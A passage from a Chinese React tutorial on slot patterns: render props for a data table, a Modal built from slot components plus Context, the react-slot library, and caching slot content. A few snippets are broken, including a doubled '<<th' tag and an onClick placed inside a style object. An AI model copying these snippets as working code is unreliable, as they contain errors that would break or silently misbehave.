            &lt;<span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">style</span>={{ fontSize: '14px', <span class="hljs-attribute">color</span>: <span class="hljs-string">'#666'</span> }}&gt;身份：{<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.role</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;
          &lt;/<span class="hljs-selector-tag">div</span>&gt;
        )}
      &lt;/<span class="hljs-selector-tag">UserList</span>&gt;
    &lt;/<span class="hljs-selector-tag">div</span>&gt;
  );
}
</code></pre>
<h3 data-id="heading-13">方案 2：render props（显式声明渲染函数）</h3>
<p>通过专门的 props（如 <code>renderItem</code>）传递渲染函数，语义更明确，适用于需要多个渲染函数的复杂组件。</p>
<h4 data-id="heading-14">实例：数据表格组件（支持表头和行渲染定制）</h4>
<pre><code class="hljs language-css" lang="css">// 子组件：数据表格（通过 render props 暴露表头和行数据）
function DataTable({ <span class="hljs-attribute">columns</span>, data, renderHeader, renderRow }) {
  return (
    &lt;<span class="hljs-selector-tag">table</span> style={{ <span class="hljs-attribute">width</span>: <span class="hljs-string">'100%'</span>, borderCollapse: <span class="hljs-string">'collapse'</span>, border: <span class="hljs-string">'1px solid #eee'</span> }}&gt;
      {<span class="hljs-comment">/* 表头渲染：调用 renderHeader 传递列配置 */</span>}
      &lt;<span class="hljs-selector-tag">thead</span>&gt;
        &lt;<span class="hljs-selector-tag">tr</span> style={{ backgroundColor: <span class="hljs-string">'#f5f5f5'</span> }}&gt;
          {<span class="hljs-attribute">columns</span><span class="hljs-selector-class">.map</span>((col) =&gt; (
            &lt;&lt;<span class="hljs-selector-tag">th</span> key={col<span class="hljs-selector-class">.key</span>} style={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'12px'</span>, border: <span class="hljs-string">'1px solid #eee'</span>, textAlign: <span class="hljs-string">'left'</span> }}&gt;
              {renderHeader(col)}
            &lt;/&lt;/<span class="hljs-selector-tag">th</span>&gt;
          ))}
        &lt;/<span class="hljs-selector-tag">tr</span>&gt;
      &lt;/<span class="hljs-selector-tag">thead</span>&gt;
      {<span class="hljs-comment">/* 表体渲染：调用 renderRow 传递行数据 */</span>}
      &lt;<span class="hljs-selector-tag">tbody</span>&gt;
        {data<span class="hljs-selector-class">.map</span>((row) =&gt; (
          &lt;<span class="hljs-selector-tag">tr</span> key={row<span class="hljs-selector-class">.id</span>} style={{ backgroundColor: <span class="hljs-string">'#fff'</span> }}&gt;
            {<span class="hljs-attribute">columns</span><span class="hljs-selector-class">.map</span>((col) =&gt; (
              &lt;<span class="hljs-selector-tag">td</span> key={col<span class="hljs-selector-class">.key</span>} style={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'12px'</span>, border: <span class="hljs-string">'1px solid #eee'</span> }}&gt;
                {renderRow(row, col)}
              &lt;/<span class="hljs-selector-tag">td</span>&gt;
            ))}
          &lt;/<span class="hljs-selector-tag">tr</span>&gt;
        ))}
      &lt;/<span class="hljs-selector-tag">tbody</span>&gt;
    &lt;/<span class="hljs-selector-tag">table</span>&gt;
  );
}

// 父组件使用
function App() {
  const tableColumns = <span class="hljs-selector-attr">[    { key: <span class="hljs-string">'name'</span>, label: <span class="hljs-string">'商品名称'</span> },    { key: <span class="hljs-string">'price'</span>, label: <span class="hljs-string">'价格'</span> },    { key: <span class="hljs-string">'stock'</span>, label: <span class="hljs-string">'库存'</span> },    { key: <span class="hljs-string">'action'</span>, label: <span class="hljs-string">'操作'</span> }  ]</span>;

  const tableData = <span class="hljs-selector-attr">[    { id: 1, name: <span class="hljs-string">'无线鼠标'</span>, price: 99, stock: 120 },    { id: 2, name: <span class="hljs-string">'机械键盘'</span>, price: 299, stock: 86 },    { id: 3, name: <span class="hljs-string">'显示器'</span>, price: 1299, stock: 34 }  ]</span>;

  return (
    &lt;<span class="hljs-selector-tag">div</span> style={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'20px'</span> }}&gt;
      &lt;DataTable
        <span class="hljs-attribute">columns</span>={tableColumns}
        data={tableData}
        // 定制表头渲染（添加图标）
        renderHeader={(col) =&gt; (
          &lt;<span class="hljs-selector-tag">div</span> style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, alignItems: <span class="hljs-string">'center'</span>, gap: <span class="hljs-string">'6px'</span> }}&gt;
            &lt;<span class="hljs-selector-tag">span</span>&gt;📋&lt;/<span class="hljs-selector-tag">span</span>&gt;
            {col<span class="hljs-selector-class">.label</span>}
          &lt;/<span class="hljs-selector-tag">div</span>&gt;
        )}
        // 定制行渲染（价格高亮、库存状态显示）
        renderRow={(row, col) =&gt; {
          switch (col<span class="hljs-selector-class">.key</span>) {
            case 'price':
              return &lt;span style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'red'</span>, fontWeight: <span class="hljs-string">'bold'</span> }}&gt;¥{row<span class="hljs-selector-class">.price</span>}&lt;/<span class="hljs-selector-tag">span</span>&gt;;
            case 'stock':
              return row.stock &gt; <span class="hljs-number">50</span> ? (
                &lt;span style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'green'</span> }}&gt;充足&lt;/<span class="hljs-selector-tag">span</span>&gt;
              ) : (
                &lt;span style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'orange'</span> }}&gt;紧张&lt;/<span class="hljs-selector-tag">span</span>&gt;
              );
            case 'action':
              return (
                &lt;button style={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'4px 8px'</span>, backgroundColor: <span class="hljs-string">'#42b983'</span>, color: <span class="hljs-string">'white'</span>, border: <span class="hljs-string">'none'</span>, borderRadius: <span class="hljs-string">'4px'</span> }}&gt;
                  编辑
                &lt;/<span class="hljs-selector-tag">button</span>&gt;
              );
            default:
              return row[col.key];
          }
        }}
      /&gt;
    &lt;/<span class="hljs-selector-tag">div</span>&gt;
  );
}
</code></pre>
<h2 data-id="heading-15">五、高级插槽：组件组合 + Context</h2>
<p>对于复杂组件（如弹窗、表单），需要多个分散的插槽且插槽内容可能嵌套较深时，可通过「专用插槽组件 + Context」实现，适用于大型组件库开发。</p>
<h3 data-id="heading-16">核心思路</h3>
<ol>
<li>定义容器组件（如 <code>Modal</code>），创建 Context 用于传递插槽注册函数；</li>
<li>定义专用插槽组件（如 <code>ModalHeader</code>、<code>ModalBody</code>），通过 Context 注册自身内容到容器组件；</li>
<li>容器组件收集所有插槽内容，按固定结构渲染。</li>
</ol>
<h3 data-id="heading-17">实例：多功能弹窗组件（支持头部、主体、底部、右上角插槽）</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { createContext, useContext, useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 1. 创建 Context 用于传递插槽注册函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ModalContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// 2. 定义容器组件：Modal</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Modal</span>(<span class="hljs-params">{ isOpen, onClose, children }</span>) {
  <span class="hljs-comment">// 存储所有插槽内容</span>
  <span class="hljs-keyword">const</span> [slots, setSlots] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">header</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">footer</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">closeBtn</span>: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onClose}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">background:</span> '<span class="hljs-attr">none</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">none</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">18px</span>', <span class="hljs-attr">cursor:</span> '<span class="hljs-attr">pointer</span>' }}&gt;</span>×<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  });

  <span class="hljs-comment">// 注册插槽的函数：接收插槽名称和内容，合并到 slots 中</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">registerSlot</span> = (<span class="hljs-params">name, content</span>) =&gt; {
    <span class="hljs-title function_">setSlots</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [name]: content }));
  };

  <span class="hljs-comment">// 未打开时不渲染</span>
  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// 提供 Context，让子插槽组件能访问 registerSlot</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModalContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">registerSlot</span> }}&gt;</span>
      {/* 遮罩层 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
        <span class="hljs-attr">position:</span> '<span class="hljs-attr">fixed</span>', 
        <span class="hljs-attr">top:</span> <span class="hljs-attr">0</span>, 
        <span class="hljs-attr">left:</span> <span class="hljs-attr">0</span>, 
        <span class="hljs-attr">right:</span> <span class="hljs-attr">0</span>, 
        <span class="hljs-attr">bottom:</span> <span class="hljs-attr">0</span>, 
        <span class="hljs-attr">backgroundColor:</span> '<span class="hljs-attr">rgba</span>(<span class="hljs-attr">0</span>,<span class="hljs-attr">0</span>,<span class="hljs-attr">0</span>,<span class="hljs-attr">0.5</span>)', 
        <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', 
        <span class="hljs-attr">alignItems:</span> '<span class="hljs-attr">center</span>', 
        <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">center</span>' 
      }} <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onClose}</span>&gt;</span>
        {/* 弹窗容器 */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
          <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">fff</span>', 
          <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">8px</span>', 
          <span class="hljs-attr">width:</span> '<span class="hljs-attr">500px</span>', 
          <span class="hljs-attr">maxWidth:</span> '<span class="hljs-attr">90vw</span>', 
          <span class="hljs-attr">position:</span> '<span class="hljs-attr">relative</span>',
          <span class="hljs-attr">onClick:</span> (<span class="hljs-attr">e</span>) =&gt;</span> e.stopPropagation() // 阻止冒泡关闭弹窗
        }}&gt;
          {/* 右上角插槽（默认关闭按钮） */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">position:</span> '<span class="hljs-attr">absolute</span>', <span class="hljs-attr">top:</span> '<span class="hljs-attr">16px</span>', <span class="hljs-attr">right:</span> '<span class="hljs-attr">16px</span>' }}&gt;</span>
            {slots.closeBtn}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          {/* 头部插槽 */}
          {slots.header &amp;&amp; (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span> <span class="hljs-attr">24px</span>', <span class="hljs-attr">borderBottom:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>' }}&gt;</span>
              {slots.header}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )}

          {/* 主体插槽 */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">24px</span>' }}&gt;</span>
            {slots.body || children} {/* 兼容默认插槽 */}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          {/* 底部插槽 */}
          {slots.footer &amp;&amp; (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span> <span class="hljs-attr">24px</span>', <span class="hljs-attr">borderTop:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>', <span class="hljs-attr">textAlign:</span> '<span class="hljs-attr">right</span>' }}&gt;</span>
              {slots.footer}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ModalContext.Provider</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 3. 定义专用插槽组件</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalHeader</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-keyword">const</span> { registerSlot } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ModalContext</span>);

  <span class="hljs-comment">// 组件挂载时注册插槽，卸载时清除</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'header'</span>, children);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'header'</span>, <span class="hljs-literal">null</span>);
  }, [children, registerSlot]);

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 自身不渲染，仅注册内容</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalBody</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-keyword">const</span> { registerSlot } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ModalContext</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'body'</span>, children);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'body'</span>, <span class="hljs-literal">null</span>);
  }, [children, registerSlot]);

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalFooter</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-keyword">const</span> { registerSlot } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ModalContext</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'footer'</span>, children);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'footer'</span>, <span class="hljs-literal">null</span>);
  }, [children, registerSlot]);

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ModalCloseBtn</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-keyword">const</span> { registerSlot } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ModalContext</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'closeBtn'</span>, children);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">registerSlot</span>(<span class="hljs-string">'closeBtn'</span>, <span class="hljs-literal">null</span>);
  }, [children, registerSlot]);

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 4. 父组件使用</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [isModalOpen, setIsModalOpen] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsModalOpen(true)}
        style={{ padding: '8px 16px', backgroundColor: '#42b983', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
      &gt;
        打开弹窗
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">Modal</span> <span class="hljs-attr">isOpen</span>=<span class="hljs-string">{isModalOpen}</span> <span class="hljs-attr">onClose</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsModalOpen(false)}&gt;
        {/* 专用插槽组件 */}
        <span class="hljs-tag">&lt;<span class="hljs-name">ModalHeader</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">18px</span>' }}&gt;</span>修改个人信息<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ModalHeader</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">ModalBody</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">flexDirection:</span> '<span class="hljs-attr">column</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">16px</span>' }}&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">block</span>', <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">4px</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">14px</span>' }}&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
                <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> 
                <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">"张三"</span>
                <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">padding:</span> '<span class="hljs-attr">8px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ddd</span>', <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' }}
              /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">block</span>', <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">4px</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">14px</span>' }}&gt;</span>邮箱<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
                <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span> 
                <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">"zhangsan@example.com"</span>
                <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">padding:</span> '<span class="hljs-attr">8px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ddd</span>', <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' }}
              /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ModalBody</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">ModalFooter</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">8px</span>', <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">flex-end</span>' }}&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsModalOpen(false)}
              style={{ padding: '8px 16px', backgroundColor: '#fff', color: '#333', border: '1px solid #ddd', borderRadius: '4px' }}
            &gt;
              取消
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
              <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">8px</span> <span class="hljs-attr">16px</span>', <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">42b983</span>', <span class="hljs-attr">color:</span> '<span class="hljs-attr">white</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">none</span>', <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' }}
            &gt;</span>
              保存修改
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ModalFooter</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">ModalCloseBtn</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setIsModalOpen(false)}
            style={{ background: 'none', border: 'none', fontSize: '18px', cursor: 'pointer', color: '#666' }}
          &gt;
            关闭
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ModalCloseBtn</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Modal</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-18">六、第三方库辅助：react-slot（简化命名插槽）</h2>
<p>如果项目中需要大量使用命名插槽，可借助第三方库 <code>react-slot</code> 简化代码，其提供了 <code>&lt;Slot&gt;</code> 和 <code>&lt;Fill&gt;</code> 组件，语法更接近原生插槽，适用于追求简洁语法的场景。</p>
<h3 data-id="heading-19">用法示例：导航栏组件</h3>
<p>jsx</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 1. 安装依赖</span>
<span class="hljs-comment">// npm install react-slot</span>

<span class="hljs-comment">// 2. 导入组件</span>
<span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">Slot</span>, <span class="hljs-selector-tag">Fill</span> } <span class="hljs-selector-tag">from</span> '<span class="hljs-selector-tag">react-slot</span>';

<span class="hljs-comment">// 3. 子组件：导航栏（定义插槽）</span>
<span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">Navbar</span>() {
  <span class="hljs-selector-tag">return</span> (
    &lt;nav style={{ 
      backgroundColor: '#2c3e50', 
      <span class="hljs-attribute">padding</span>: <span class="hljs-string">'16px 24px'</span>, 
      <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, 
      <span class="hljs-attribute">justifyContent</span>: <span class="hljs-string">'space-between'</span>, 
      <span class="hljs-attribute">alignItems</span>: <span class="hljs-string">'center'</span> 
    }}&gt;
      {<span class="hljs-comment">/* 左侧插槽 */</span>}
      &lt;div style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">alignItems</span>: <span class="hljs-string">'center'</span> }}&gt;
        &lt;Slot name=<span class="hljs-string">"logo"</span> /&gt;
      &lt;/div&gt;

      {<span class="hljs-comment">/* 中间插槽 */</span>}
      &lt;div style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">gap</span>: <span class="hljs-string">'24px'</span> }}&gt;
        &lt;Slot name=<span class="hljs-string">"menu"</span> /&gt;
      &lt;/div&gt;

      {<span class="hljs-comment">/* 右侧插槽 */</span>}
      &lt;div style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">alignItems</span>: <span class="hljs-string">'center'</span> }}&gt;
        &lt;Slot name=<span class="hljs-string">"user"</span> /&gt;
      &lt;/div&gt;
    &lt;/nav&gt;
  );
}

<span class="hljs-comment">// 4. 父组件使用：填充插槽</span>
<span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">App</span>() {
  <span class="hljs-selector-tag">return</span> (
    &lt;Navbar&gt;
      {<span class="hljs-comment">/* 填充 logo 插槽 */</span>}
      &lt;Fill name=<span class="hljs-string">"logo"</span>&gt;
        &lt;h1 style={{ <span class="hljs-attribute">margin</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attribute">fontSize</span>: <span class="hljs-string">'20px'</span> }}&gt;Logo&lt;/h1&gt;
      &lt;/Fill&gt;

      {<span class="hljs-comment">/* 填充 menu 插槽 */</span>}
      &lt;Fill name=<span class="hljs-string">"menu"</span>&gt;
        &lt;a href=<span class="hljs-string">"/"</span> style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attribute">textDecoration</span>: <span class="hljs-string">'none'</span> }}&gt;首页&lt;/a&gt;
        &lt;a href=<span class="hljs-string">"/products"</span> style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attribute">textDecoration</span>: <span class="hljs-string">'none'</span> }}&gt;产品&lt;/a&gt;
        &lt;a href=<span class="hljs-string">"/contact"</span> style={{ <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attribute">textDecoration</span>: <span class="hljs-string">'none'</span> }}&gt;联系我们&lt;/a&gt;
      &lt;/Fill&gt;

      {<span class="hljs-comment">/* 填充 user 插槽 */</span>}
      &lt;Fill name=<span class="hljs-string">"user"</span>&gt;
        &lt;button style={{ 
          <span class="hljs-attribute">padding</span>: <span class="hljs-string">'6px 12px'</span>, 
          <span class="hljs-attribute">backgroundColor</span>: <span class="hljs-string">'#42b983'</span>, 
          <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, 
          <span class="hljs-attribute">border</span>: <span class="hljs-string">'none'</span>, 
          <span class="hljs-attribute">borderRadius</span>: <span class="hljs-string">'4px'</span> 
        }}&gt;
          登录
        &lt;/button&gt;
      &lt;/Fill&gt;
    &lt;/Navbar&gt;
  );
}
</code></pre>
<h2 data-id="heading-20">七、最佳实践与性能优化</h2>
<h3 data-id="heading-21">1. 插槽方案选择指南</h3>
<ul>
<li>简单内容传递（无分区）→ <code>children</code> prop（默认插槽）；</li>
<li>固定多区域（如布局、卡片）→ 多 props 命名插槽（简洁高效）；</li>
<li>子组件传数据 + 父组件定制渲染 → 函数作为 children（作用域插槽）；</li>
<li>复杂组件（多插槽、深嵌套）→ 组件组合 + Context；</li>
<li>追求 Vue 式简洁语法 → react-slot 第三方库。</li>
</ul>
<h3 data-id="heading-22">2. 性能优化关键要点</h3>
<ul>
<li>避免每次渲染创建新组件：将插槽内容提取到组件外部或使用 <code>useMemo</code> 缓存；</li>
</ul>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 错误示例：每次渲染创建新对象/组件</span>
&lt;<span class="hljs-title class_">ProductCard</span>&gt;
  {{
    <span class="hljs-attr">title</span>: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>商品名称<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>, <span class="hljs-comment">// 每次渲染都是新元素</span>
    <span class="hljs-attr">action</span>: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>购买<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  }}
&lt;/<span class="hljs-title class_">ProductCard</span>&gt;

<span class="hljs-comment">// 正确示例：缓存插槽内容</span>
<span class="hljs-keyword">const</span> productSlots = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-attr">title</span>: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>商品名称<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>,
  <span class="hljs-attr">action</span>: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>购买<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
